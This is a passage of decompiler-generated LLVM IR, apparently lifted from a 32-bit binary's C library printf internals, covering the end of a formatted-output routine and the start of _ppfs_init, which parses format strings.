  %v0_804e6fe = phi i32 [ %v0_804e6e6, %dec_label_pc_804e6dc ], [ %v0_804e6f7.pre, %dec_label_pc_804e6ed ]
  %v1_804e6f7 = add i32 %v0_804e6fe, 32
  %v2_804e6f7 = inttoptr i32 %v1_804e6f7 to i8*
  %v3_804e6f7 = load i8, i8* %v2_804e6f7, align 1
  %v4_804e6f7 = and i8 %v3_804e6f7, 8
  %v5_804e6f7 = icmp eq i8 %v4_804e6f7, 0
  %v1_804e6fc = icmp eq i1 %v5_804e6f7, false
  br i1 %v1_804e6fc, label %dec_label_pc_804e725, label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %dec_label_pc_804e6f7
  %v1_804e6fe = add i32 %v0_804e6fe, 8
  %v2_804e6fe = inttoptr i32 %v1_804e6fe to i32*
  %v3_804e6fe = load i32, i32* %v2_804e6fe, align 4
  store i32 %v3_804e6fe, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e707 = add i32 %v0_804e6fe, 368
  %v2_804e707 = inttoptr i32 %v1_804e707 to i32*
  %v3_804e707 = load i32, i32* %v2_804e707, align 4
  store i32 %v3_804e707, i32* @eax, align 4
  %v0_804e70e = call i32 @_charpad()
  store i32 %v0_804e70e, i32* %eax.global-to-local, align 4
  %v1_804e713 = load i32, i32* @esp, align 4
  %v2_804e713 = add i32 %v1_804e713, 8
  %v3_804e713 = inttoptr i32 %v2_804e713 to i32*
  %v4_804e713 = load i32, i32* %v3_804e713, align 4
  %v15_804e713 = icmp eq i32 %v0_804e70e, %v4_804e713
  %v1_804e717 = icmp eq i1 %v15_804e713, false
  br i1 %v1_804e717, label %dec_label_pc_804e813, label %dec_label_pc_804e71d

dec_label_pc_804e71d:                             ; preds = %dec_label_pc_804e6fe
  store i32 0, i32* %v3_804e713, align 4
  %v1_804e725.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e725

dec_label_pc_804e725:                             ; preds = %dec_label_pc_804e6f7, %dec_label_pc_804e71d
  %v1_804e725 = phi i32 [ %v0_804e6fe, %dec_label_pc_804e6f7 ], [ %v1_804e725.pre, %dec_label_pc_804e71d ]
  %v0_804e725 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e725 = add i32 %v1_804e725, -4
  %v3_804e725 = inttoptr i32 %v2_804e725 to i32*
  store i32 %v0_804e725, i32* %v3_804e725, align 4
  %v0_804e726 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e726 = add i32 %v1_804e725, -8
  %v3_804e726 = inttoptr i32 %v2_804e726 to i32*
  store i32 %v0_804e726, i32* %v3_804e726, align 4
  %v1_804e727 = add i32 %v1_804e725, 368
  %v2_804e727 = inttoptr i32 %v1_804e727 to i32*
  %v3_804e727 = load i32, i32* %v2_804e727, align 4
  %v5_804e727 = add i32 %v1_804e725, -12
  %v6_804e727 = inttoptr i32 %v5_804e727 to i32*
  store i32 %v3_804e727, i32* %v6_804e727, align 4
  %v0_804e72e = load i32, i32* @ebp, align 4
  %v1_804e72e = add i32 %v0_804e72e, ptrtoint (i32* @global_var_8056e05.204 to i32)
  store i32 %v1_804e72e, i32* %eax.global-to-local, align 4
  %v2_804e734 = add i32 %v1_804e725, -16
  %v3_804e734 = inttoptr i32 %v2_804e734 to i32*
  store i32 %v1_804e72e, i32* %v3_804e734, align 4
  %v0_804e735 = load i32, i32* %stack_var_-364, align 4
  %v4_804e735 = inttoptr i32 %v0_804e735 to i8*
  %v5_804e735 = call i32 @__GI_fputs_unlocked(i8* %v4_804e735, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e735, i32* %eax.global-to-local, align 4
  %v0_804e73a = load i32, i32* @esp, align 4
  %v1_804e73a = add i32 %v0_804e73a, 384
  %v2_804e73a = inttoptr i32 %v1_804e73a to i32*
  %v3_804e73a = load i32, i32* %v2_804e73a, align 4
  store i32 %v3_804e73a, i32* @eax, align 4
  %v0_804e741 = load i32, i32* @ebx, align 4
  store i32 %v0_804e741, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e748 = call i32 @_charpad()
  store i32 %v0_804e748, i32* %eax.global-to-local, align 4
  %v0_804e74d = load i32, i32* @esp, align 4
  %v1_804e74d = add i32 %v0_804e74d, 16
  %v1_804e750 = load i32, i32* @ebx, align 4
  %v12_804e750 = icmp eq i32 %v0_804e748, %v1_804e750
  %v1_804e752 = icmp eq i1 %v12_804e750, false
  br i1 %v1_804e752, label %dec_label_pc_804e813, label %dec_label_pc_804e758

dec_label_pc_804e758:                             ; preds = %dec_label_pc_804e725
  %v1_804e758 = add i32 %v0_804e74d, 356
  %v2_804e758 = inttoptr i32 %v1_804e758 to i32*
  %v3_804e758 = load i32, i32* %v2_804e758, align 4
  %v4_804e758 = icmp eq i32 %v3_804e758, 0
  %v1_804e760 = icmp eq i1 %v4_804e758, false
  br i1 %v1_804e760, label %dec_label_pc_804e784, label %dec_label_pc_804e762

dec_label_pc_804e762:                             ; preds = %dec_label_pc_804e758
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e764 = load i32, i32* @esi, align 4
  %v1_804e764 = icmp eq i32 %v0_804e764, 0
  br i1 %v1_804e764, label %dec_label_pc_804e77a.thread, label %dec_label_pc_804e77a

dec_label_pc_804e77a.thread:                      ; preds = %dec_label_pc_804e762
  br label %dec_label_pc_804e7e5

dec_label_pc_804e77a:                             ; preds = %dec_label_pc_804e762
  %v2_804e768 = add i32 %v0_804e74d, 12
  %v3_804e768 = inttoptr i32 %v2_804e768 to i32*
  store i32 0, i32* %v3_804e768, align 4
  %v1_804e769 = add i32 %v0_804e74d, 384
  %v2_804e769 = inttoptr i32 %v1_804e769 to i32*
  %v3_804e769 = load i32, i32* %v2_804e769, align 4
  %v5_804e769 = add i32 %v0_804e74d, 8
  %v6_804e769 = inttoptr i32 %v5_804e769 to i32*
  store i32 %v3_804e769, i32* %v6_804e769, align 4
  %v0_804e770 = load i32, i32* @esi, align 4
  %v2_804e770 = add i32 %v0_804e74d, 4
  %v3_804e770 = inttoptr i32 %v2_804e770 to i32*
  store i32 %v0_804e770, i32* %v3_804e770, align 4
  %v0_804e771 = load i32, i32* @edi, align 4
  %v3_804e771 = inttoptr i32 %v0_804e74d to i32*
  store i32 %v0_804e771, i32* %v3_804e771, align 4
  %v0_804e772 = load i32, i32* %stack_var_-364, align 4
  %v4_804e772 = call i32 @__stdio_fwrite(i32 %v0_804e772, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e772, i32* %eax.global-to-local, align 4
  %v0_804e777 = load i32, i32* @esp, align 4
  %v1_804e777 = add i32 %v0_804e777, 16
  %v1_804e77a.pre = load i32, i32* @esi, align 4
  %v12_804e77a = icmp eq i32 %v4_804e772, %v1_804e77a.pre
  %v1_804e77c = icmp eq i1 %v12_804e77a, false
  br i1 %v1_804e77c, label %dec_label_pc_804e813, label %dec_label_pc_804e7e5

dec_label_pc_804e784:                             ; preds = %dec_label_pc_804e758
  %v1_804e784 = add i32 %v0_804e74d, 348
  %v2_804e784 = inttoptr i32 %v1_804e784 to i32*
  store i32 0, i32* %v2_804e784, align 4
  %v0_804e7e17 = load i32, i32* @esi, align 4
  %v1_804e7e18 = icmp eq i32 %v0_804e7e17, 0
  %v1_804e7e315 = icmp eq i1 %v1_804e7e18, false
  br i1 %v1_804e7e315, label %dec_label_pc_804e791, label %dec_label_pc_804e784.dec_label_pc_804e7e5.loopexit_crit_edge

dec_label_pc_804e784.dec_label_pc_804e7e5.loopexit_crit_edge: ; preds = %dec_label_pc_804e784
  %v0_804e7e5.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e7e5

dec_label_pc_804e791:                             ; preds = %dec_label_pc_804e784, %dec_label_pc_804e7df
  %v0_804e791 = phi i32 [ %v2_804e7df, %dec_label_pc_804e7df ], [ %v0_804e7e17, %dec_label_pc_804e784 ]
  %tmp102 = icmp ult i32 %v0_804e791, 129
  br i1 %tmp102, label %dec_label_pc_804e7a0, label %dec_label_pc_804e79b

dec_label_pc_804e79b:                             ; preds = %dec_label_pc_804e791
  br label %dec_label_pc_804e7a0

dec_label_pc_804e7a0:                             ; preds = %dec_label_pc_804e791, %dec_label_pc_804e79b
  %storemerge103 = phi i32 [ 128, %dec_label_pc_804e79b ], [ %v0_804e791, %dec_label_pc_804e791 ]
  store i32 %storemerge103, i32* %edx.global-to-local, align 4
  %v0_804e7a0 = load i32, i32* @esp, align 4
  %v1_804e7a0 = add i32 %v0_804e7a0, 332
  %v2_804e7a7 = add i32 %v0_804e7a0, -4
  %v3_804e7a7 = inttoptr i32 %v2_804e7a7 to i32*
  store i32 %v1_804e7a0, i32* %v3_804e7a7, align 4
  %v0_804e7a8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e7a8 = add i32 %v0_804e7a0, -8
  %v3_804e7a8 = inttoptr i32 %v2_804e7a8 to i32*
  store i32 %v0_804e7a8, i32* %v3_804e7a8, align 4
  %v1_804e7a9 = add i32 %v0_804e7a0, 340
  store i32 %v1_804e7a9, i32* %eax.global-to-local, align 4
  %v2_804e7b0 = add i32 %v0_804e7a0, -12
  %v3_804e7b0 = inttoptr i32 %v2_804e7b0 to i32*
  store i32 %v1_804e7a9, i32* %v3_804e7b0, align 4
  %v1_804e7b1 = add i32 %v0_804e7a0, 204
  store i32 %v1_804e7b1, i32* @edi, align 4
  %v2_804e7b8 = add i32 %v0_804e7a0, -16
  %v3_804e7b8 = inttoptr i32 %v2_804e7b8 to i32*
  store i32 %v1_804e7b1, i32* %v3_804e7b8, align 4
  %v0_804e7b9 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e7b9, i32* @ebx, align 4
  %v0_804e7c0 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e7c5 = icmp eq i32 %v0_804e7b9, 0
  br i1 %v1_804e7c5, label %dec_label_pc_804e7db, label %dec_label_pc_804e7c9

dec_label_pc_804e7c9:                             ; preds = %dec_label_pc_804e7a0
  %v0_804e7c9 = load i32, i32* @ebp, align 4
  %v2_804e7c9 = add i32 %v0_804e7c0, 12
  %v3_804e7c9 = inttoptr i32 %v2_804e7c9 to i32*
  store i32 %v0_804e7c9, i32* %v3_804e7c9, align 4
  %v1_804e7ca = add i32 %v0_804e7c0, 384
  %v2_804e7ca = inttoptr i32 %v1_804e7ca to i32*
  %v3_804e7ca = load i32, i32* %v2_804e7ca, align 4
  %v5_804e7ca = add i32 %v0_804e7c0, 8
  %v6_804e7ca = inttoptr i32 %v5_804e7ca to i32*
  store i32 %v3_804e7ca, i32* %v6_804e7ca, align 4
  %v2_804e7d1 = add i32 %v0_804e7c0, 4
  %v3_804e7d1 = inttoptr i32 %v2_804e7d1 to i32*
  store i32 %v0_804e7b9, i32* %v3_804e7d1, align 4
  %v0_804e7d2 = load i32, i32* @edi, align 4
  %v3_804e7d2 = inttoptr i32 %v0_804e7c0 to i32*
  store i32 %v0_804e7d2, i32* %v3_804e7d2, align 4
  %v0_804e7d3 = load i32, i32* %stack_var_-364, align 4
  %v4_804e7d3 = call i32 @__stdio_fwrite(i32 %v0_804e7d3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e7d3, i32* %eax.global-to-local, align 4
  %v0_804e7d8 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e7db

dec_label_pc_804e7db:                             ; preds = %dec_label_pc_804e7a0, %dec_label_pc_804e7c9
  %v0_804e81349.in = phi i32 [ %v0_804e7c0, %dec_label_pc_804e7a0 ], [ %v0_804e7d8, %dec_label_pc_804e7c9 ]
  %v1_804e7df = phi i32 [ 0, %dec_label_pc_804e7a0 ], [ %v4_804e7d3, %dec_label_pc_804e7c9 ]
  %v0_804e81349 = add i32 %v0_804e81349.in, 16
  %v12_804e7db = icmp eq i32 %v1_804e7df, %v0_804e7b9
  %v1_804e7dd = icmp eq i1 %v12_804e7db, false
  br i1 %v1_804e7dd, label %dec_label_pc_804e813, label %dec_label_pc_804e7df

dec_label_pc_804e7df:                             ; preds = %dec_label_pc_804e7db
  %v0_804e7df = load i32, i32* @esi, align 4
  %v2_804e7df = sub i32 %v0_804e7df, %v1_804e7df
  %v12_804e7df = icmp eq i32 %v2_804e7df, 0
  store i32 %v2_804e7df, i32* @esi, align 4
  %v1_804e7e3 = icmp eq i1 %v12_804e7df, false
  br i1 %v1_804e7e3, label %dec_label_pc_804e791, label %dec_label_pc_804e7e5

dec_label_pc_804e7e5:                             ; preds = %dec_label_pc_804e7df, %dec_label_pc_804e77a.thread, %dec_label_pc_804e784.dec_label_pc_804e7e5.loopexit_crit_edge, %dec_label_pc_804e77a
  %v0_804e7e5 = phi i32 [ %v1_804e777, %dec_label_pc_804e77a ], [ %v0_804e7e5.pre.pre, %dec_label_pc_804e784.dec_label_pc_804e7e5.loopexit_crit_edge ], [ %v1_804e74d, %dec_label_pc_804e77a.thread ], [ %v0_804e81349, %dec_label_pc_804e7df ]
  %v1_804e7e5 = add i32 %v0_804e7e5, 8
  %v2_804e7e5 = inttoptr i32 %v1_804e7e5 to i32*
  %v3_804e7e5 = load i32, i32* %v2_804e7e5, align 4
  store i32 %v3_804e7e5, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e7ee = add i32 %v0_804e7e5, 368
  %v2_804e7ee = inttoptr i32 %v1_804e7ee to i32*
  %v3_804e7ee = load i32, i32* %v2_804e7ee, align 4
  store i32 %v3_804e7ee, i32* @eax, align 4
  %v0_804e7f5 = call i32 @_charpad()
  store i32 %v0_804e7f5, i32* %eax.global-to-local, align 4
  %v1_804e7fa = load i32, i32* @esp, align 4
  %v2_804e7fa = add i32 %v1_804e7fa, 8
  %v3_804e7fa = inttoptr i32 %v2_804e7fa to i32*
  %v4_804e7fa = load i32, i32* %v3_804e7fa, align 4
  %v15_804e7fa = icmp eq i32 %v0_804e7f5, %v4_804e7fa
  %v1_804e7fe = icmp eq i1 %v15_804e7fa, false
  br i1 %v1_804e7fe, label %dec_label_pc_804e813, label %dec_label_pc_804e800

dec_label_pc_804e800:                             ; preds = %dec_label_pc_804e7e5, %dec_label_pc_804e57a, %dec_label_pc_804e3a8
  %v0_804e800 = phi i32 [ %v1_804e7fa, %dec_label_pc_804e7e5 ], [ %v0_804e800.pre, %dec_label_pc_804e57a ], [ %v1_804e3c6, %dec_label_pc_804e3a8 ]
  %v1_804e800 = add i32 %v0_804e800, 16
  %v2_804e800 = inttoptr i32 %v1_804e800 to i32*
  %v3_804e800 = load i32, i32* %v2_804e800, align 4
  store i32 %v3_804e800, i32* @ebx, align 4
  store i32 %v3_804e800, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e300.backedge

dec_label_pc_804e80b:                             ; preds = %dec_label_pc_804e33e
  %v1_804e80b = add i32 %v0_804e80b, 2
  store i32 %v1_804e80b, i32* @ebx, align 4
  br label %dec_label_pc_804e300.backedge

dec_label_pc_804e813:                             ; preds = %dec_label_pc_804e32a, %dec_label_pc_804e7e5, %dec_label_pc_804e77a, %dec_label_pc_804e725, %dec_label_pc_804e6fe, %dec_label_pc_804e66e, %dec_label_pc_804e5e9, %dec_label_pc_804e5bd, %dec_label_pc_804e551, %dec_label_pc_804e7db
  %v0_804e813 = phi i32 [ %v0_804e81349, %dec_label_pc_804e7db ], [ %v0_804e813.pre.pre, %dec_label_pc_804e32a ], [ %v1_804e7fa, %dec_label_pc_804e7e5 ], [ %v1_804e777, %dec_label_pc_804e77a ], [ %v1_804e74d, %dec_label_pc_804e725 ], [ %v1_804e713, %dec_label_pc_804e6fe ], [ %v0_804e3a0.lcssa, %dec_label_pc_804e66e ], [ %v1_804e601, %dec_label_pc_804e5e9 ], [ %v1_804e5d4, %dec_label_pc_804e5bd ], [ %v1_804e56f, %dec_label_pc_804e551 ]
  %v1_804e813 = inttoptr i32 %v0_804e813 to i32*
  store i32 -1, i32* %v1_804e813, align 4
  br label %dec_label_pc_804e81a

dec_label_pc_804e81a:                             ; preds = %dec_label_pc_804e335, %dec_label_pc_804e2a3, %dec_label_pc_804e2c2, %dec_label_pc_804e813
  %v0_804e81a = load i32, i32* @esp, align 4
  %v1_804e81a = inttoptr i32 %v0_804e81a to i32*
  %v2_804e81a = load i32, i32* %v1_804e81a, align 4
  store i32 %v2_804e81a, i32* %eax.global-to-local, align 4
  %v1_804e81d = add i32 %v0_804e81a, 348
  %v1_804e823 = inttoptr i32 %v1_804e81d to i32*
  %v2_804e823 = load i32, i32* %v1_804e823, align 4
  store i32 %v2_804e823, i32* @ebx, align 4
  ret i32 %v2_804e81a

; uselistorder directives
  uselistorder i32 %v1_804e80b, { 1, 0 }
  uselistorder i32 %v3_804e800, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e7e5, { 1, 0 }
  uselistorder i32 %v2_804e7df, { 1, 2, 0 }
  uselistorder i32 %v0_804e81349, { 1, 0 }
  uselistorder i32 %v1_804e7df, { 1, 0 }
  uselistorder i32 %v0_804e7c0, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e74d, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e725, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e6fe, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e6d2, { 1, 0, 2 }
  uselistorder i32 %v6_804e6bf, { 1, 0 }
  uselistorder i32 %v1_804e6bc, { 1, 0 }
  uselistorder i32 %v0_804e6b5, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e63f, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e64f, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e5b0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e596, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e52f, { 1, 0, 2 }
  uselistorder i32 %v1_804e4b3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e506, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e48f, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e448, { 1, 0 }
  uselistorder i32 %v1_804e455, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e3a0, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804e3a0.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e39c, { 1, 0 }
  uselistorder i32 %v1_804e39c.pre, { 1, 0 }
  uselistorder i32 %v1_804e39b, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e398, { 1, 0 }
  uselistorder i32 %v2_804e39c80, { 1, 0 }
  uselistorder i32 %v3_804e382, { 1, 0 }
  uselistorder i32 %v1_804e33e, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e30a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e30e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e2f8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 1, 2, 4, 7, 0, 6, 5, 3, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e81a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e813, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e7e5, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e7db, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e791, { 1, 0 }
  uselistorder label %dec_label_pc_804e725, { 1, 0 }
  uselistorder label %dec_label_pc_804e6f7, { 1, 0 }
  uselistorder label %dec_label_pc_804e6dc, { 1, 0 }
  uselistorder label %dec_label_pc_804e6c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e6b2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e6a6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e63f, { 1, 0 }
  uselistorder label %dec_label_pc_804e632, { 1, 0 }
  uselistorder label %dec_label_pc_804e5bd, { 1, 0 }
  uselistorder label %dec_label_pc_804e551, { 1, 0 }
  uselistorder label %dec_label_pc_804e506, { 1, 0 }
  uselistorder label %dec_label_pc_804e4f7, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e4bd, { 1, 0 }
  uselistorder label %dec_label_pc_804e4a4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e455, { 1, 0 }
  uselistorder label %dec_label_pc_804e43c, { 1, 0 }
  uselistorder label %dec_label_pc_804e428, { 1, 0 }
  uselistorder label %dec_label_pc_804e423, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e404, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e391, { 1, 0 }
  uselistorder label %dec_label_pc_804e389, { 1, 0 }
  uselistorder label %dec_label_pc_804e335, { 1, 0 }
  uselistorder label %dec_label_pc_804e32a, { 1, 0 }
  uselistorder label %dec_label_pc_804e300.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e828 = load i32, i32* @esi, align 4
  %v0_804e829 = load i32, i32* @ebx, align 4
  store i32 %v0_804e829, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e83d = bitcast i32* %arg1 to i8*
  %v4_804e83d = call i32 @__GI_memset(i8* %v3_804e83d, i32 0, i32 188)
  store i32 %v4_804e83d, i32* %eax.global-to-local, align 4
  %v0_804e842 = load i32, i32* @ebx, align 4
  %v1_804e842 = add i32 %v0_804e842, 24
  %v2_804e842 = inttoptr i32 %v1_804e842 to i32*
  %v3_804e842 = load i32, i32* %v2_804e842, align 4
  %v4_804e842 = add i32 %v3_804e842, -1
  store i32 %v4_804e842, i32* %v2_804e842, align 4
  %v0_804e845 = load i32, i32* @esi, align 4
  %v1_804e845 = load i32, i32* @ebx, align 4
  %v2_804e845 = inttoptr i32 %v1_804e845 to i32*
  store i32 %v0_804e845, i32* %v2_804e845, align 4
  %v0_804e847 = load i32, i32* @ebx, align 4
  %v1_804e847 = add i32 %v0_804e847, 40
  store i32 %v1_804e847, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e852

dec_label_pc_804e852:                             ; preds = %dec_label_pc_804e852, %entry
  %v0_804e852 = phi i32 [ %v1_804e858, %dec_label_pc_804e852 ], [ %v1_804e847, %entry ]
  %v1_804e852 = inttoptr i32 %v0_804e852 to i32*
  store i32 8, i32* %v1_804e852, align 4
  %v0_804e858 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e858 = add i32 %v0_804e858, 4
  store i32 %v1_804e858, i32* %eax.global-to-local, align 4
  %v0_804e85b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e85b = add i32 %v0_804e85b, -1
  %v8_804e85b = icmp eq i32 %v1_804e85b, 0
  store i32 %v1_804e85b, i32* %edx.global-to-local, align 4
  %v1_804e85c = icmp eq i1 %v8_804e85b, false
  br i1 %v1_804e85c, label %dec_label_pc_804e852, label %dec_label_pc_804e85e

dec_label_pc_804e85e:                             ; preds = %dec_label_pc_804e852
  %v0_804e85e = load i32, i32* @esi, align 4
  store i32 %v0_804e85e, i32* %eax.global-to-local, align 4
  %v1_804e88920 = inttoptr i32 %v0_804e85e to i8*
  %v2_804e88921 = load i8, i8* %v1_804e88920, align 1
  %v3_804e88922 = zext i8 %v2_804e88921 to i32
  %v5_804e88923 = and i32 %v1_804e85b, -256
  %v6_804e88924 = or i32 %v3_804e88922, %v5_804e88923
  store i32 %v6_804e88924, i32* %edx.global-to-local, align 4
  %v4_804e88b25 = icmp eq i8 %v2_804e88921, 0
  %v1_804e88d26 = icmp eq i1 %v4_804e88b25, false
  br i1 %v1_804e88d26, label %dec_label_pc_804e867, label %dec_label_pc_804e88f

dec_label_pc_804e867:                             ; preds = %dec_label_pc_804e85e, %dec_label_pc_804e889.backedge
  %v6_804e88929 = phi i32 [ %v6_804e889, %dec_label_pc_804e889.backedge ], [ %v6_804e88924, %dec_label_pc_804e85e ]
  %v2_804e88928 = phi i8 [ %v2_804e889, %dec_label_pc_804e889.backedge ], [ %v2_804e88921, %dec_label_pc_804e85e ]
  %v0_804e86c27 = phi i32 [ %v0_804e86c.be, %dec_label_pc_804e889.backedge ], [ %v0_804e85e, %dec_label_pc_804e85e ]
  %v10_804e867 = icmp eq i8 %v2_804e88928, 37
  %v1_804e86a = icmp eq i1 %v10_804e867, false
  br i1 %v1_804e86a, label %dec_label_pc_804e888, label %dec_label_pc_804e86c

dec_label_pc_804e86c:                             ; preds = %dec_label_pc_804e867
  %v1_804e86c = add i32 %v0_804e86c27, 1
  store i32 %v1_804e86c, i32* %eax.global-to-local, align 4
  %v1_804e86d = inttoptr i32 %v1_804e86c to i8*
  %v2_804e86d = load i8, i8* %v1_804e86d, align 1
  %v11_804e86d = icmp eq i8 %v2_804e86d, 37
  br i1 %v11_804e86d, label %dec_label_pc_804e888, label %dec_label_pc_804e872

dec_label_pc_804e872:                             ; preds = %dec_label_pc_804e86c
  %v1_804e875 = load i32, i32* @ebx, align 4
  %v2_804e875 = inttoptr i32 %v1_804e875 to i32*
  store i32 %v1_804e86c, i32* %v2_804e875, align 4
  %v0_804e877 = load i32, i32* @ebx, align 4
  %v1_804e878 = inttoptr i32 %v0_804e877 to i32*
  %v2_804e878 = call i32 @_ppfs_parsespec(i32* %v1_804e878)
  store i32 %v2_804e878, i32* %eax.global-to-local, align 4
  %v2_804e880 = icmp slt i32 %v2_804e878, 0
  br i1 %v2_804e880, label %dec_label_pc_804e893, label %dec_label_pc_804e884

dec_label_pc_804e884:                             ; preds = %dec_label_pc_804e872
  %v0_804e884 = load i32, i32* @ebx, align 4
  %v1_804e884 = inttoptr i32 %v0_804e884 to i32*
  %v2_804e884 = load i32, i32* %v1_804e884, align 4
  %v4_804e889.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e889.backedge

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e86c, %dec_label_pc_804e867
  %v0_804e888 = phi i32 [ %v1_804e86c, %dec_label_pc_804e86c ], [ %v0_804e86c27, %dec_label_pc_804e867 ]
  %v1_804e888 = add i32 %v0_804e888, 1
  br label %dec_label_pc_804e889.backedge

dec_label_pc_804e889.backedge:                    ; preds = %dec_label_pc_804e888, %dec_label_pc_804e884
  %v4_804e889.be = phi i32 [ %v4_804e889.pre.pre, %dec_label_pc_804e884 ], [ %v6_804e88929, %dec_label_pc_804e888 ]
  %v0_804e86c.be = phi i32 [ %v2_804e884, %dec_label_pc_804e884 ], [ %v1_804e888, %dec_label_pc_804e888 ]
  store i32 %v0_804e86c.be, i32* %eax.global-to-local, align 4
  %v1_804e889 = inttoptr i32 %v0_804e86c.be to i8*
  %v2_804e889 = load i8, i8* %v1_804e889, align 1
  %v3_804e889 = zext i8 %v2_804e889 to i32
  %v5_804e889 = and i32 %v4_804e889.be, -256
  %v6_804e889 = or i32 %v3_804e889, %v5_804e889
  store i32 %v6_804e889, i32* %edx.global-to-local, align 4
  %v4_804e88b = icmp eq i8 %v2_804e889, 0
  %v1_804e88d = icmp eq i1 %v4_804e88b, false
  br i1 %v1_804e88d, label %dec_label_pc_804e867, label %dec_label_pc_804e889.dec_label_pc_804e88f_crit_edge

dec_label_pc_804e889.dec_label_pc_804e88f_crit_edge: ; preds = %dec_label_pc_804e889.backedge
  %v0_804e88f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e88f

dec_label_pc_804e88f:                             ; preds = %dec_label_pc_804e889.dec_label_pc_804e88f_crit_edge, %dec_label_pc_804e85e
